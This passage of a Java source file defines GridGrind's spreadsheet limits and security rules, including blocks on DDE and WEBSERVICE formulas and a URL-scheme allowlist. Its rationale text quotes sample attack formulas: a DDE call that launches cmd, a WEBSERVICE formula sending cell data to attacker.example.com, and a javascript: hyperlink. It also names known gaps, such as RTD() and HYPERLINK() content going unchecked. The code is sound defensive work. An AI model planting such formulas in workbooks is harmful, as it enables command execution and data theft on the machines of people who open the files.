package dev.erst.gridgrind.core.limits;

import java.util.List;
import java.util.Locale;
import java.util.Optional;

/** Stable limit identities and facts shared by enforcement and published references. */
public record Limit(
    String id,
    String title,
    String category,
    String value,
    List<String> problemCodes,
    String messageTemplate,
    List<String> appliesTo,
    String rationale) {
  public Limit {
    java.util.Objects.requireNonNull(id, "id");
    java.util.Objects.requireNonNull(title, "title");
    java.util.Objects.requireNonNull(category, "category");
    java.util.Objects.requireNonNull(value, "value");
    problemCodes = List.copyOf(problemCodes);
    java.util.Objects.requireNonNull(messageTemplate, "messageTemplate");
    appliesTo = List.copyOf(appliesTo);
    java.util.Objects.requireNonNull(rationale, "rationale");
  }

  /** Canonical max read cells. */
  public static final int MAX_READ_CELLS = 250_000;

  /** Canonical max sheet name length. */
  public static final int MAX_SHEET_NAME_LENGTH = 31;

  /** Canonical max column width characters. */
  public static final double MAX_COLUMN_WIDTH_CHARACTERS = 255.0d;

  /** Canonical max default column width. */
  public static final int MAX_DEFAULT_COLUMN_WIDTH = 255;

  /** Canonical max row height points. */
  public static final double MAX_ROW_HEIGHT_POINTS = 409.0d;

  /** Canonical min zoom percent. */
  public static final int MIN_ZOOM_PERCENT = 10;

  /** Canonical max zoom percent. */
  public static final int MAX_ZOOM_PERCENT = 400;

  /** Canonical max row index. */
  public static final int MAX_ROW_INDEX = 1_048_575;

  /** Canonical max column index. */
  public static final int MAX_COLUMN_INDEX = 16_383;

  /** Canonical max cell text length. */
  public static final int MAX_CELL_TEXT_LENGTH = 32_767;

  /** Canonical max cell styles. */
  public static final int MAX_CELL_STYLES = 64_000;

  /** Canonical max hyperlinks. */
  public static final int MAX_HYPERLINKS = 65_530;

  /** Canonical max formula length. */
  public static final int MAX_FORMULA_LENGTH = 8192;

  /** Canonical max nested function levels. */
  public static final int MAX_NESTED_FUNCTION_LEVELS = 64;

  /** Canonical max function arguments. */
  public static final int MAX_FUNCTION_ARGUMENTS = 255;

  /** Canonical max steps. */
  public static final int MAX_STEPS = 10_000;

  /** Canonical max materialized work items. */
  public static final long MAX_MATERIALIZED_WORK_ITEMS = 250_000L;

  /** Canonical max explicit list formula length. */
  public static final int MAX_EXPLICIT_LIST_FORMULA_LENGTH = 255;

  /** Canonical request document limit bytes. */
  public static final long REQUEST_DOCUMENT_LIMIT_BYTES = 16L * 1024 * 1024;

  /** Canonical max zip entry size. */
  public static final long MAX_ZIP_ENTRY_SIZE = 100L * 1024 * 1024;

  /** Canonical min zip inflate ratio. */
  public static final double MIN_ZIP_INFLATE_RATIO = 0.01d;

  /** Canonical workbook path suffix. */
  public static final String WORKBOOK_PATH_SUFFIX = ".xlsx";

  /** Canonical step id pattern. */
  public static final String STEP_ID_PATTERN = "[A-Za-z0-9._-]+";

  /** Formula prefixes blocked at authored formula input boundaries. */
  public static final String DDE_FUNCTION_PREFIX = "dde(";

  /** Web-service formula prefix blocked at authored formula input boundaries. */
  public static final String WEBSERVICE_FUNCTION_PREFIX = "webservice(";

  /** Exact rejection wording shared with the security policy entry. */
  public static final String DDE_REJECTION =
      "formula must not use the DDE function; DDE formula execution is a security risk";

  /** Exact rejection wording shared with the security policy entry. */
  public static final String WEBSERVICE_REJECTION =
      "formula must not use the WEBSERVICE function; WEBSERVICE triggers outbound HTTP requests when the workbook is opened in Excel";

  /** URL hyperlink schemes admitted by the authoring contract. */
  public static final java.util.Set<String> URL_SCHEMES =
      java.util.Set.of("http", "https", "ftp", "ftps");

  /** Stable identity of cell returning read count. */
  public static final String ID_CELL_RETURNING_READ_COUNT = "LIM-001";

  /** Stable identity of file format. */
  public static final String ID_FILE_FORMAT = "LIM-002";

  /** Stable identity of sheet name contract. */
  public static final String ID_SHEET_NAME_CONTRACT = "LIM-003";

  /** Stable identity of column width. */
  public static final String ID_COLUMN_WIDTH = "LIM-004";

  /** Stable identity of row height. */
  public static final String ID_ROW_HEIGHT = "LIM-005";

  /** Stable identity of duplicate step ids. */
  public static final String ID_DUPLICATE_STEP_IDS = "LIM-006";

  /** Stable identity of step id token shape. */
  public static final String ID_STEP_ID_TOKEN_SHAPE = "LIM-006A";

  /** Stable identity of get cells address list. */
  public static final String ID_GET_CELLS_ADDRESS_LIST = "LIM-007";

  /** Stable identity of maximum rows per worksheet. */
  public static final String ID_MAXIMUM_ROWS_PER_WORKSHEET = "LIM-008";

  /** Stable identity of maximum columns per worksheet. */
  public static final String ID_MAXIMUM_COLUMNS_PER_WORKSHEET = "LIM-009";

  /** Stable identity of maximum text characters per cell. */
  public static final String ID_MAXIMUM_TEXT_CHARACTERS_PER_CELL = "LIM-010";

  /** Stable identity of maximum cell styles per workbook. */
  public static final String ID_MAXIMUM_CELL_STYLES_PER_WORKBOOK = "LIM-011";

  /** Stable identity of maximum hyperlinks per worksheet. */
  public static final String ID_MAXIMUM_HYPERLINKS_PER_WORKSHEET = "LIM-012";

  /** Stable identity of maximum formula length. */
  public static final String ID_MAXIMUM_FORMULA_LENGTH = "LIM-013";

  /** Stable identity of maximum nested function levels. */
  public static final String ID_MAXIMUM_NESTED_FUNCTION_LEVELS = "LIM-014";

  /** Stable identity of maximum function arguments. */
  public static final String ID_MAXIMUM_FUNCTION_ARGUMENTS = "LIM-015";

  /** Stable identity of structural edits that would move unsupported owned structures. */
  public static final String ID_STRUCTURAL_EDITS_THAT_WOULD_MOVE_UNSUPPORTED_OWNED_STRUCTURES =
      "LIM-016";

  /** Stable identity of column structural edits while formulas are present. */
  public static final String ID_COLUMN_STRUCTURAL_EDITS_WHILE_FORMULAS_ARE_PRESENT = "LIM-017";

  /** Stable identity of destructive structural edits against range backed named ranges. */
  public static final String ID_DESTRUCTIVE_STRUCTURAL_EDITS_AGAINST_RANGE_BACKED_NAMED_RANGES =
      "LIM-018";

  /** Stable identity of event read execution mode scope. */
  public static final String ID_EVENT_READ_EXECUTION_MODE_SCOPE = "LIM-019";

  /** Stable identity of streaming write execution mode scope. */
  public static final String ID_STREAMING_WRITE_EXECUTION_MODE_SCOPE = "LIM-020";

  /** Stable identity of request json size. */
  public static final String ID_REQUEST_JSON_SIZE = "LIM-021";

  /** Stable identity of sheet zoom percentage. */
  public static final String ID_SHEET_ZOOM_PERCENTAGE = "LIM-022";

  /** Stable identity of dde formula injection. */
  public static final String ID_DDE_FORMULA_INJECTION = "LIM-023";

  /** Stable identity of step count. */
  public static final String ID_STEP_COUNT = "LIM-024";

  /** Stable identity of request owned path containment. */
  public static final String ID_REQUEST_OWNED_PATH_CONTAINMENT = "LIM-025";

  /** Stable identity of zip decompression limits. */
  public static final String ID_ZIP_DECOMPRESSION_LIMITS = "LIM-026";

  /** Stable identity of dde rejection in all formula inputs. */
  public static final String ID_DDE_REJECTION_IN_ALL_FORMULA_INPUTS = "LIM-027";

  /** Stable identity of url scheme allowlist. */
  public static final String ID_URL_SCHEME_ALLOWLIST = "LIM-028";

  /** Stable identity of no follow request path binding. */
  public static final String ID_NO_FOLLOW_REQUEST_PATH_BINDING = "LIM-029";

  /** Stable identity of file backed authored input isolation. */
  public static final String ID_FILE_BACKED_AUTHORED_INPUT_ISOLATION = "LIM-030";

  /** Stable identity of webservice formula rejection. */
  public static final String ID_WEBSERVICE_FORMULA_REJECTION = "LIM-031";

  /** Stable identity of named range formula injection. */
  public static final String ID_NAMED_RANGE_FORMULA_INJECTION = "LIM-032";

  /** Stable identity of chart title formula injection. */
  public static final String ID_CHART_TITLE_FORMULA_INJECTION = "LIM-033";

  /** Stable identity of udf formula template injection defense in depth. */
  public static final String ID_UDF_FORMULA_TEMPLATE_INJECTION_DEFENSE_IN_DEPTH = "LIM-034";

  /** Stable identity of hyperlink formula content not validated against url allowlist. */
  public static final String ID_HYPERLINK_FORMULA_CONTENT_NOT_VALIDATED_AGAINST_URL_ALLOWLIST =
      "LIM-035";

  /** Stable identity of rtd function not blocked. */
  public static final String ID_RTD_FUNCTION_NOT_BLOCKED = "LIM-036";

  /** Stable identity of workbookfactory may open xls files presented as xlsx. */
  public static final String ID_WORKBOOK_SOURCE_CONTENT_FORMAT = "LIM-037";

  /** Stable identity of ooxml write encryption is agile only and strong only. */
  public static final String ID_OOXML_WRITE_ENCRYPTION_IS_AGILE_ONLY_AND_STRONG_ONLY = "LIM-038";

  /** Stable identity of materialized worksheet work per plan. */
  public static final String ID_MATERIALIZED_WORKSHEET_WORK_PER_PLAN = "LIM-039";

  /** Stable identity of explicit data validation list formula length. */
  public static final String ID_EXPLICIT_DATA_VALIDATION_LIST_FORMULA_LENGTH = "LIM-040";

  /** Materialized Worksheet Work per Plan. */
  public static final Limit MATERIALIZED_WORKSHEET_WORK_PER_PLAN =
      new Limit(
          ID_MATERIALIZED_WORKSHEET_WORK_PER_PLAN,
          "Materialized Worksheet Work per Plan",
          "GridGrind",
          MAX_MATERIALIZED_WORK_ITEMS + " materialized worksheet items per plan",
          List.of("INVALID_REQUEST"),
          "`materialized worksheet work must not exceed "
              + MAX_MATERIALIZED_WORK_ITEMS
              + " items per plan; this step raises the total to {n}`",
          List.of(
              "APPLY_STYLE",
              "CLEAR_RANGE",
              "SET_ARRAY_FORMULA",
              "SET_RANGE",
              "SET_ROW_HEIGHT",
              "SET_ROW_VISIBILITY",
              "GROUP_ROWS",
              "UNGROUP_ROWS"),
          "GridGrind counts every action that must enumerate cells or create physical rows before the workbook\nis opened. The cumulative limit prevents a syntactically valid plan from exhausting the JVM by\nmaterializing an Excel-sized range or row band, including when equivalent work is spread across\nseveral steps.");

  /** Explicit Data-Validation List Formula Length. */
  public static final Limit EXPLICIT_DATA_VALIDATION_LIST_FORMULA_LENGTH =
      new Limit(
          ID_EXPLICIT_DATA_VALIDATION_LIST_FORMULA_LENGTH,
          "Explicit Data-Validation List Formula Length",
          "Excel / GridGrind",
          MAX_EXPLICIT_LIST_FORMULA_LENGTH + " characters in the stored explicit-list formula",
          List.of("INVALID_REQUEST"),
          "`values must serialize to at most 255 characters for Excel data validation; got {n}`",
          List.of("EXPLICIT_LIST"),
          "Excel data-validation explicit lists are stored as one quoted comma-separated formula. GridGrind\nrejects commas and quotes inside individual values because that representation cannot preserve them;\nuse `FORMULA_LIST` when values require delimiters. It validates the complete stored formula before\nApache POI authoring so callers receive the request path and computed length instead of a library\nexception.");

  /** Cell-Returning Read Count. */
  public static final Limit CELL_RETURNING_READ_COUNT =
      new Limit(
          ID_CELL_RETURNING_READ_COUNT,
          "Cell-Returning Read Count",
          "GridGrind",
          MAX_READ_CELLS + " cells",
          List.of("INVALID_REQUEST"),
          "`addresses must not exceed "
              + MAX_READ_CELLS
              + " but was {n}` / `rowCount * columnCount must not exceed "
              + MAX_READ_CELLS
              + " but was {n}`",
          List.of("GET_CELLS", "GET_WINDOW", "GET_SHEET_SCHEMA"),
          "Excel allows worksheets with up to "
              + String.format(Locale.ROOT, "%,d", MAX_ROW_INDEX + 1)
              + " rows and "
              + String.format(Locale.ROOT, "%,d", MAX_COLUMN_INDEX + 1)
              + " columns. POI can read arbitrarily\nlarge windows and exact address lists; GridGrind must then materialize and serialize factual cell\npayloads. Sparse `GET_WINDOW` readback reduces blank-heavy payloads, but it does not change the\nworst case: a dense 50,000-cell window still returns 50,000 factual cells, `GET_SHEET_SCHEMA`\nstill examines the entire rectangular sample even when many cells are blank, and an oversized\n`GET_CELLS` address list still asks GridGrind to return one factual cell report per address. The\n"
              + String.format(Locale.ROOT, "%,d", MAX_READ_CELLS)
              + "-cell cap keeps the request gate deterministic before workbook IO and prevents\n`OutOfMemoryError`, empty response files, and unstructured exit-code-1 failures on worst-case\ncell-returning reads.\n\nThis limit is not from Apache POI or Excel. A serialized-byte cap depends on workbook contents and is only knowable after reading the\nworkbook. The deterministic cell-count cap bounds materialization before workbook IO.\n\n**Recommended pattern for large sheets:** Use `GET_SHEET_SUMMARY` to discover `lastRowIndex` and\n`lastColumnIndex`, then either chunk exact `GET_CELLS` address lists or tile the populated region\nwith multiple bounded `GET_WINDOW` reads.");

  /** File Format. */
  public static final Limit FILE_FORMAT =
      new Limit(
          ID_FILE_FORMAT,
          "File Format",
          "GridGrind",
          WORKBOOK_PATH_SUFFIX,
          List.of("INVALID_REQUEST"),
          "`path must point to a .xlsx workbook; .xls, .xlsm, and .xlsb are not supported: {path}`",
          List.of("source", "persistence"),
          "GridGrind intentionally narrows Apache POI's broader OOXML workbook support to plain `.xlsx`.\n`.xls` (BIFF8/HSSF), macro-enabled `.xlsm`, and `.xlsb` (binary) are all rejected by the product\ncontract even though Apache POI can preserve and extract VBA-bearing `.xlsm` packages.");

  /** Sheet Name Contract. */
  public static final Limit SHEET_NAME_CONTRACT =
      new Limit(
          ID_SHEET_NAME_CONTRACT,
          "Sheet Name Contract",
          "GridGrind (enforces Excel limit)",
          "1.." + MAX_SHEET_NAME_LENGTH + " characters, with Excel sheet-name syntax",
          List.of("INVALID_REQUEST"),
          "`sheetName must not exceed 31 characters: {name}` or `sheetName contains invalid Excel character ':' at position 4: Bad:Name`",
          List.of("sheetName"),
          "The 31-character ceiling and reserved-character rules are Excel hard limits. GridGrind validates\nthem at request parse time so the error is structured and reported before any workbook work\nbegins, instead of surfacing a raw Apache POI sheet-creation exception later in execution.");

  /** Column Width. */
  public static final Limit COLUMN_WIDTH =
      new Limit(
          ID_COLUMN_WIDTH,
          "Column Width",
          "GridGrind (enforces Excel limit)",
          "0 < width <= " + MAX_COLUMN_WIDTH_CHARACTERS,
          List.of("INVALID_REQUEST"),
          "`widthCharacters must not exceed 255.0 (Excel column width limit): got {n}` / `widthCharacters is too small to produce a visible Excel column width: got {n}`",
          List.of("SET_COLUMN_WIDTH", "SET_SHEET_PRESENTATION.sheetDefaults.defaultColumnWidth"),
          "255 character units is the Excel column width ceiling. POI converts explicit column widths to\ninternal units with `round(widthCharacters * 256)`. Values that round to zero are also rejected.\nSheet-wide default column widths are integer character counts and use the same Excel ceiling.\n`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit column\nwidths can still be reported above `255` instead of being clamped.");

  /** Row Height. */
  public static final Limit ROW_HEIGHT =
      new Limit(
          ID_ROW_HEIGHT,
          "Row Height",
          "GridGrind (enforces Excel limit)",
          "0 < height <= " + MAX_ROW_HEIGHT_POINTS + " points",
          List.of("INVALID_REQUEST"),
          "`heightPoints must not exceed 409.0 (Excel row height limit): got {n}` / `heightPoints is too small to produce a visible Excel row height: {n}`",
          List.of("SET_ROW_HEIGHT", "SET_SHEET_PRESENTATION.sheetDefaults.defaultRowHeightPoints"),
          "Excel's published maximum row height is 409 points for `.xlsx` worksheets. Apache POI can store a\nlarger twip value internally, but GridGrind aligns the product contract to the real Excel limit\ninstead of the wider storage envelope. Values that round to zero twips are also rejected.\n`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit row heights\nand default row-height values can still be reported above `409.0` instead of being clamped.");

  /** Duplicate Step IDs. */
  public static final Limit DUPLICATE_STEP_IDS =
      new Limit(
          ID_DUPLICATE_STEP_IDS,
          "Duplicate Step IDs",
          "GridGrind",
          "`stepId` values in the `steps` array must be unique",
          List.of("INVALID_REQUEST"),
          "`steps must not contain duplicate stepId values: {id}`",
          List.of("steps"),
          "Step identity must remain unambiguous in ordered execution, diagnostics and evidence.");

  /** Step ID Token Shape. */
  public static final Limit STEP_ID_TOKEN_SHAPE =
      new Limit(
          ID_STEP_ID_TOKEN_SHAPE,
          "Step ID Token Shape",
          "GridGrind",
          STEP_ID_PATTERN,
          List.of("INVALID_REQUEST"),
          "`stepId must match [A-Za-z0-9._-]+`",
          List.of("steps[*].stepId"),
          "Stable machine-readable step tokens avoid ambiguous diagnostic paths and lookup identities.");

  /** GET_CELLS Address List. */
  public static final Limit GET_CELLS_ADDRESS_LIST =
      new Limit(
          ID_GET_CELLS_ADDRESS_LIST,
          "GET_CELLS Address List",
          "GridGrind",
          "`addresses` must be non-empty and contain no duplicates",
          List.of("INVALID_REQUEST"),
          "`addresses must not be empty` / `addresses must not contain duplicates`",
          List.of("GET_CELLS"),
          "A nonempty distinct address list defines one factual result per requested coordinate.");

  /** DDE Formula Injection. */
  public static final Limit DDE_FORMULA_INJECTION =
      new Limit(
          ID_DDE_FORMULA_INJECTION,
          "DDE Formula Injection",
          "GridGrind",
          "`CellValueSpec.Formula` must not use the Excel DDE function",
          List.of("INVALID_REQUEST"),
          "`source must not use the DDE function; DDE formula execution is a security risk`",
          List.of("CellValueSpec.Formula", "INLINE"),
          "Dynamic Data Exchange (DDE) formulas such as `DDE(\"cmd\", \"/C calc\", \"\")` can invoke external\nprograms when the saved workbook is opened in Microsoft Excel on Windows. GridGrind rejects inline\nformula sources that begin with `DDE(` (case-insensitive) after stripping the leading `=`.\nFile-backed formula sources are not validated at construction time but are equally subject to this\nconstraint in execution.");

  /** Step Count. */
  public static final Limit STEP_COUNT =
      new Limit(
          ID_STEP_COUNT,
          "Step Count",
          "GridGrind",
          MAX_STEPS + " steps",
          List.of("INVALID_REQUEST"),
          "`steps must not exceed 10000 entries but was {n}`",
          List.of("steps"),
          "Unbounded step lists enable runaway resource consumption and extended execution times. The 10,000-\nstep ceiling is generous enough for legitimate bulk streaming-write workflows (for example, 10,000\n`APPEND_ROW` mutations) while preventing pathological inputs. The separate 16 MiB JSON cap\n(`LIM-021`) further bounds the total request size independent of step count.");

  /** Request-Owned Path Containment. */
  public static final Limit REQUEST_OWNED_PATH_CONTAINMENT =
      new Limit(
          ID_REQUEST_OWNED_PATH_CONTAINMENT,
          "Request-Owned Path Containment",
          "GridGrind",
          "Every request-owned path, whether relative or absolute, must resolve beneath the execution root",
          List.of("PATH_ESCAPES_ROOT"),
          "`path must not escape the execution root: {path}`",
          List.of(
              "Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs"),
          "GridGrind normalizes every request-owned path against the execution root before it opens or writes\nanything. A relative traversal such as `../secret.xlsx` and an absolute path outside the root fail\nwith the same code. A contained absolute path remains legal but carries a warning because it relies\non one host-specific root layout. CLI flag paths are invocation controls, not request-owned paths.");

  /** ZIP Decompression Limits. */
  public static final Limit ZIP_DECOMPRESSION_LIMITS =
      new Limit(
          ID_ZIP_DECOMPRESSION_LIMITS,
          "ZIP Decompression Limits",
          "GridGrind",
          MAX_ZIP_ENTRY_SIZE
              + " decompressed bytes per entry; minimum inflate ratio "
              + MIN_ZIP_INFLATE_RATIO,
          List.of("INVALID_REQUEST"),
          "",
          List.of("All xlsx workbook open operations"),
          "GridGrind explicitly configures Apache POI's `ZipSecureFile` limits to bound decompression memory\nand time during xlsx package open. An entry expanding beyond 100 MiB or achieving a compression\nratio beyond 1:100 triggers a `ZipBombException`, which GridGrind translates to an\n`INVALID_REQUEST` failure rather than an `OutOfMemoryError` or indefinite CPU consumption.");

  /** DDE Rejection in All Formula Inputs. */
  public static final Limit DDE_REJECTION_IN_ALL_FORMULA_INPUTS =
      new Limit(
          ID_DDE_REJECTION_IN_ALL_FORMULA_INPUTS,
          "DDE Rejection in All Formula Inputs",
          "GridGrind",
          "DDE function forbidden in all formula-bearing inputs",
          List.of("INVALID_REQUEST"),
          "",
          List.of(
              "ArrayFormulaSpec",
              "DataValidationRuleSpec",
              "ConditionalFormattingRuleSpec",
              "ConditionalFormattingThresholdSpec.Formula",
              "ChartDataSourceSpec.Reference.formula"),
          "GridGrind rejects any formula string that begins with `DDE(` (case-insensitive, stripping leading\n`=` or `{=...}` prefixes first) across all formula-bearing input types. The DDE (Dynamic Data\nExchange) function is a Windows IPC mechanism; embedding it in an xlsx workbook can trigger\narbitrary command execution when the file is opened in Microsoft Excel. This guard extends the\n`CellValueSpec.Formula` protection (LIM-023) to every remaining formula surface written to xlsx output.");

  /** URL Scheme Allowlist. */
  public static final Limit URL_SCHEME_ALLOWLIST =
      new Limit(
          ID_URL_SCHEME_ALLOWLIST,
          "URL Scheme Allowlist",
          "GridGrind",
          "Only `http`, `https`, `ftp`, and `ftps` schemes accepted for URL hyperlinks",
          List.of("INVALID_REQUEST"),
          "",
          List.of("HyperlinkTarget.Url"),
          "GridGrind enforces an explicit allowlist of URL schemes for `HyperlinkTarget.Url` targets.\nSchemes such as `javascript:`, `vbscript:`, `ms-excel:`, `ldap:`, and `data:` are rejected.\nThese schemes can trigger script execution, protocol-handler abuse, or cross-site scripting when\nthe hyperlink is activated in a browser-based spreadsheet viewer or other host application.");

  /** No-Follow Request Path Binding. */
  public static final Limit NO_FOLLOW_REQUEST_PATH_BINDING =
      new Limit(
          ID_NO_FOLLOW_REQUEST_PATH_BINDING,
          "No-Follow Request Path Binding",
          "GridGrind",
          "Request-owned reads and writes never follow a symbolic link and use descriptor-relative access below a verified execution root",
          List.of("UNSAFE_PATH_ACCESS"),
          "",
          List.of(
              "Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs"),
          "GridGrind binds the root and every existing parent with no-follow directory descriptors, records\ntheir filesystem identities, copies request inputs into private staging, and commits output through\nthe retained parent descriptor. Any symlink is rejected, including a link that happens to point\ninside the root. Immediately before persistence, GridGrind rechecks the recorded topology and\nfails closed if it observes a replacement, unlink, rename, or symlink transition.\n\nThis protects containment while the bound filesystem topology remains stable. It does not claim\nabsolute containment against a principal that can mutate that topology in the scheduling window\nbetween the final identity recheck and a descriptor-relative commit; Java exposes no proven,\nportable root-anchored atomic-resolve-and-commit primitive for that stronger guarantee.");

  /** File-Backed Authored Input Isolation. */
  public static final Limit FILE_BACKED_AUTHORED_INPUT_ISOLATION =
      new Limit(
          ID_FILE_BACKED_AUTHORED_INPUT_ISOLATION,
          "File-Backed Authored Input Isolation",
          "GridGrind",
          "File-backed text and binary authored inputs are read only through the request-owned no-follow binding and are resolved before workbook mutation",
          List.of(
              "PATH_ESCAPES_ROOT",
              "UNSAFE_PATH_ACCESS",
              "INPUT_SOURCE_NOT_FOUND",
              "INPUT_SOURCE_IO_ERROR"),
          "",
          List.of("TextSourceSpec.Utf8File", "BinarySourceSpec.File"),
          "The resolver reads each authored file through the same containment and no-follow capability used\nfor workbooks and signing material, then normalizes its bytes into the in-memory plan. The later\nmutation phase never reopens an authored path string, so a source-file race cannot redirect the\ncontent that was validated during preflight.");

  /** WEBSERVICE Formula Rejection. */
  public static final Limit WEBSERVICE_FORMULA_REJECTION =
      new Limit(
          ID_WEBSERVICE_FORMULA_REJECTION,
          "WEBSERVICE Formula Rejection",
          "GridGrind",
          "Formula inputs must not use the `WEBSERVICE` function",
          List.of("INVALID_REQUEST"),
          "",
          List.of("FormulaInputSecurity.rejectDde"),
          "Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and\nformulas are evaluated, making it a data-exfiltration vector. A formula such as\n`=WEBSERVICE(\"https://attacker.example.com/collect?d=\"&ENCODEURL(A1))` causes the downstream\nExcel client to send cell data to an attacker-controlled server without any user interaction.\n`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`\n(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.");

  /** Named-Range Formula Injection. */
  public static final Limit NAMED_RANGE_FORMULA_INJECTION =
      new Limit(
          ID_NAMED_RANGE_FORMULA_INJECTION,
          "Named-Range Formula Injection",
          "GridGrind",
          "Named-range formula targets must not use the `DDE` or `WEBSERVICE` functions",
          List.of("INVALID_REQUEST"),
          "",
          List.of("NamedRangeTarget.Formula"),
          "Named-range formulas are written into the xlsx defined-names part and evaluated automatically by\nExcel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`\nwith `kind: FORMULA` and a payload such as `DDE(\"cmd\",\"/C calc\",\"\")` or\n`WEBSERVICE(\"https://attacker.example.com/\")` would execute without any user interaction.\n`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.");

  /** Chart Title Formula Injection. */
  public static final Limit CHART_TITLE_FORMULA_INJECTION =
      new Limit(
          ID_CHART_TITLE_FORMULA_INJECTION,
          "Chart Title Formula Injection",
          "GridGrind",
          "Chart title formula inputs must not use the `DDE` or `WEBSERVICE` functions",
          List.of("INVALID_REQUEST"),
          "",
          List.of("ChartTitleSpec.Formula"),
          "Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart\non workbook open. A `ChartTitleSpec` with `type: FORMULA` and a DDE or WEBSERVICE payload executes\nwithout user interaction. `ChartTitleSpec.Formula` now calls `FormulaInputSecurity.rejectDde`.");

  /** UDF Formula Template Injection (Defense-in-Depth). */
  public static final Limit UDF_FORMULA_TEMPLATE_INJECTION_DEFENSE_IN_DEPTH =
      new Limit(
          ID_UDF_FORMULA_TEMPLATE_INJECTION_DEFENSE_IN_DEPTH,
          "UDF Formula Template Injection (Defense-in-Depth)",
          "GridGrind",
          "UDF formula templates must not use the `DDE` or `WEBSERVICE` functions",
          List.of("INVALID_REQUEST"),
          "",
          List.of("FormulaUdfFunctionSpec.formulaTemplate"),
          "UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE\nor WEBSERVICE and would return an evaluation error for those functions. Templates are also never\nwritten to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.\nThe guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.");

  /** HYPERLINK() Formula Content Not Validated Against URL Allowlist. */
  public static final Limit HYPERLINK_FORMULA_CONTENT_NOT_VALIDATED_AGAINST_URL_ALLOWLIST =
      new Limit(
          ID_HYPERLINK_FORMULA_CONTENT_NOT_VALIDATED_AGAINST_URL_ALLOWLIST,
          "HYPERLINK() Formula Content Not Validated Against URL Allowlist",
          "GridGrind (accepted limitation)",
          "`HYPERLINK()` payloads inside formula strings are not inspected for URL scheme",
          List.of(),
          "",
          List.of("CellValueSpec.Formula", "NamedRangeTarget.Formula", "ChartTitleSpec.Formula"),
          "The URL scheme allowlist in LIM-028 applies to `HyperlinkInput`, not to formula-embedded\nhyperlinks. A formula such as `=HYPERLINK(\"javascript:evil()\")` passes `FormulaInputSecurity.rejectDde`\nand is written to the xlsx file. The risk delta versus LIM-028 is limited: `HYPERLINK()` requires a\nuser click to navigate and is not auto-evaluated on workbook open. The `DDE(` and `WEBSERVICE(` patterns\nthat execute automatically are already blocked. Closing this gap fully would require an embedded\nformula parser; the accepted residual risk is click-triggered URI navigation only.");

  /** RTD() Function Not Blocked. */
  public static final Limit RTD_FUNCTION_NOT_BLOCKED =
      new Limit(
          ID_RTD_FUNCTION_NOT_BLOCKED,
          "RTD() Function Not Blocked",
          "GridGrind (accepted limitation)",
          "`RTD()` (Real-Time Data) in formula strings is not blocked",
          List.of(),
          "",
          List.of("all formula inputs"),
          "`RTD()` connects to a registered Windows COM automation server when the workbook is opened on\nWindows. `FormulaInputSecurity.rejectDde` does not block `RTD()`. The risk is platform-scoped:\n`RTD()` is a no-op on macOS and Linux, and on Windows it requires a pre-registered COM server on\nthe consuming workstation. GridGrind targets server-side xlsx generation workloads where COM\ninfrastructure is absent. Blocking `RTD()` would require a formula parser; the accepted risk is\nWindows-only and depends on attacker-controlled COM registration on the target machine.");

  /** Source workbook content is admitted as OOXML independently of its suffix. */
  public static final Limit WORKBOOK_SOURCE_CONTENT_FORMAT =
      new Limit(
          ID_WORKBOOK_SOURCE_CONTENT_FORMAT,
          "Workbook Source Content Format",
          "GridGrind",
          "Binary XLS content is rejected even when its filename ends in .xlsx",
          List.of("WORKBOOK_NOT_OPENABLE"),
          "Only .xlsx workbooks are supported",
          List.of("source", "EXISTING"),
          "The materialized reader constructs XSSFWorkbook rather than the general WorkbookFactory. "
              + "A native HSSF-written control renamed to .xlsx is rejected, while an OOXML control reopens. ");

  /** OOXML Write Encryption Is AGILE-Only And Strong-Only. */
  public static final Limit OOXML_WRITE_ENCRYPTION_IS_AGILE_ONLY_AND_STRONG_ONLY =
      new Limit(
          ID_OOXML_WRITE_ENCRYPTION_IS_AGILE_ONLY_AND_STRONG_ONLY,
          "OOXML Write Encryption Is AGILE-Only And Strong-Only",
          "Protocol",
          "Write-side OOXML package encryption authors AGILE only, defaults to `AES_256` / `SHA_512`, and allows only `AES_256` or `AES_192` plus `SHA_512`, `SHA_384`, or `SHA_256`",
          List.of(),
          "",
          List.of("persistence.security.encryption"),
          "GridGrind reads and reports broader factual OOXML encryption state than it authors. Inspection may\nsurface legacy envelopes such as `STANDARD`, weaker AGILE variants, or non-default hashes because\nthe goal on the read path is factual reporting. The write path is intentionally narrower:\nauthorable persistence security owns one explicit strong-only AGILE contract and does not accept a\n`mode` field. Existing-workbook writes declare encryption explicitly: `NONE`, `ENCRYPT`, or\n`PRESERVE_SOURCE`; omission never inherits source encryption. `PRESERVE_SOURCE` applies only to a\nverified source envelope that the strong AGILE write contract can reapply. Readable/reportable `STANDARD` envelopes are outside the authorable strong-only AGILE write\ncontract.");

  /** Maximum Rows per Worksheet. */
  public static final Limit MAXIMUM_ROWS_PER_WORKSHEET =
      new Limit(
          ID_MAXIMUM_ROWS_PER_WORKSHEET,
          "Maximum Rows per Worksheet",
          "GridGrind (enforces Excel limit for addressed row indices and bands)",
          (MAX_ROW_INDEX + 1) + " rows",
          List.of(),
          "",
          List.of(),
          "Last valid zero-based row index: "
              + String.format(Locale.ROOT, "%,d", MAX_ROW_INDEX)
              + ".\n\nGridGrind already rejects out-of-bounds addressed rows on the public request path for selectors,\nrow-band operations, row-structural edits, and print-title row bands instead of deferring those\nerrors to Apache POI.");

  /** Maximum Columns per Worksheet. */
  public static final Limit MAXIMUM_COLUMNS_PER_WORKSHEET =
      new Limit(
          ID_MAXIMUM_COLUMNS_PER_WORKSHEET,
          "Maximum Columns per Worksheet",
          "GridGrind (enforces Excel limit for addressed column indices and bands)",
          (MAX_COLUMN_INDEX + 1) + " columns",
          List.of(),
          "",
          List.of(),
          "Last valid zero-based column index: "
              + String.format(Locale.ROOT, "%,d", MAX_COLUMN_INDEX)
